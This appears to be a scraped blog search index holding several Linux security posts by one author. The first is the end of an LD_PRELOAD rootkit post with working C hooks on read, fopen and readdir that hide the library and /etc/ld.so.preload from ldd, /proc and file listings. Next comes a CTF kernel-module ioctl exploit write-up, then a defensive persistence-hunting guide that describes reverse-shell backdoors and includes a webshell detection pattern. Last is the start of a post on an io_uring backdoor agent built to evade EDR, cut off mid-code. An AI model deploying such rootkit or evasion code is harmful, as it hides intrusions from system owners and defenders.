= end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); 